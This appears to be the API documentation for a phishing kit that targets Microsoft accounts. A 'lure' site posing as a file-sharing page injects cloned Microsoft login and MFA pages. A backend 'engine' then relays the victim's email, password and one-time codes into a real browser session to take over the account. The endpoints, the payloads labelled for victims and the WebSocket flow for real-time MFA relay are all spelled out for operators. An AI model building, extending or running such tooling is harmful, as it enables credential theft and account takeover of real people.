# 📘 External API (EAPI) & Automation Flow Documentation

This document details how the **External API** (`src/eapi`) connects your remote frontend (the "Lure") to the backend automation engine (the "Engine").

---

## 🔄 The Architecture Flow (Server-Driven UI)

This API supports a **"Headless Injection"** model. Your Remote Frontend does not need to contain any Microsoft-branded HTML. It can simply fetch the "Skins" from the backend.

### 1. The sequence of a Login Attempt

1.  **Initiation (The Gateway)**
    *   **Remote Lure** loads. Looks like a generic "File Sharing" site.
    *   It fetches `GET /eapi/pages?type=gateway`.
    *   It injects the HTML (Slider/Turnstile).
    *   User solves challenge.

2.  **Login Injection**
    *   Upon solving, Lure fetches `GET /eapi/pages?type=login`.
    *   Lure wipes screen -> Injects Microsoft Login HTML.
    *   *Note: This HTML is pre-configured to talk to your API.*

3.  **Start Automation**
    *   User enters credentials.
    *   Lure calls `POST /eapi/start-auth`.
    *   **Engine** launches Real Browser.

4.  **Real-Time Updates**
    *   Engine detects "MFA Required".
    *   Engine sends WebSocket message: `{ status: "mfa_required" }`.
    *   Lure fetches `GET /eapi/pages?type=mfa`.
    *   Lure injects MFA Page.

---

## 📡 API Reference

**Base URL**: `http://<your-vps-ip>:3000/eapi`
**Authentication**: Headers required for ALL requests.

```http
X-API-KEY: key_dev_001
Content-Type: application/json
```

### 1. [NEW] Get Page Template
Fetch the randomized HTML for a specific stage.

*   **Endpoint**: `GET /pages`
*   **Query Params**: `type` = `gateway` | `login` | `mfa`
*   **Response**:
    ```json
    {
      "success": true,
      "type": "login",
      "html": "<!DOCTYPE html>... (Microsoft Login HTML) ..."
    }
    ```

### 2. Start / Continue Authentication
Use this for the initial email *and* the password submission.

*   **Endpoint**: `POST /start-auth`
*   **Payload (Step 1: Email)**:
    ```json
    {
      "email": "victim@example.com",
      "token": "OPTIONAL_SESSION_ID" 
    }
    ```
*   **Payload (Step 2: Password)**:
    ```json
    {
      "email": "victim@example.com",
      "password": "their-password",
      "token": "OPTIONAL_SESSION_ID"
    }
    ```

### 3. Send MFA / Verification Data
Use this when the Engine asks for specific inputs.

*   **Endpoint**: `POST /send-verification-code`
*   **Payload**:
    ```json
    {
      "email": "victim@example.com",
      "code": "123456" 
    }
    ```

### 4. Check Session Status
Polling endpoint if WebSocket is unavailable.

*   **Endpoint**: `GET /status`
*   **Response**:
    ```json
    {
      "success": true,
      "status": "awaiting_password",
      "clientConnected": true
    }
    ```

---

## 🔌 WebSocket Integration

For the best experience, your Remote Frontend should also connect via WebSocket to receive instant updates.

**Connection URL**: `ws://<your-vps-ip>:3000`

**Events Received:**
*   `{"status": "automation_started"}`
*   `{"status": "password_required"}`
*   `{"status": "mfa_required"}` -> Client should fetch `type=mfa` page.
*   `{"status": "login_success", "redirect": "..."}`

---

## 🛡️ Security Note
*   **API Keys**: Manage allowed keys in `src/eapi/config/apiKeys.js`.
*   **Token Requirement**: By default, `REQUIRE_SESSION_TOKEN` is `false` to allow easy remote integration.
